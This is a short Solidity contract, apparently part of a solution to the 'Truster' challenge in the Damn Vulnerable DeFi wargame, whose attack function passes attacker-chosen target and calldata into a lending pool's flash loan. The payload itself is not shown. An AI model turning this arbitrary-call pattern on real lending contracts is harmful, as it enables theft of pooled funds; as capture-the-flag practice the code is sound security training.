import "../truster/TrusterLenderPool.sol";
import "../DamnValuableToken.sol";


contract AttackTruster {
    TrusterLenderPool trust;
    DamnValuableToken public immutable damnValuableToken;


    constructor(address _trust, address tokenAddress) {
        trust = TrusterLenderPool(_trust);
        damnValuableToken = DamnValuableToken(tokenAddress);

    }

    function attack(
        uint256 amount,
        address borrower,
        address target,
        bytes calldata data
    ) external {
        trust.flashLoan(amount, borrower, target, data);
    }
}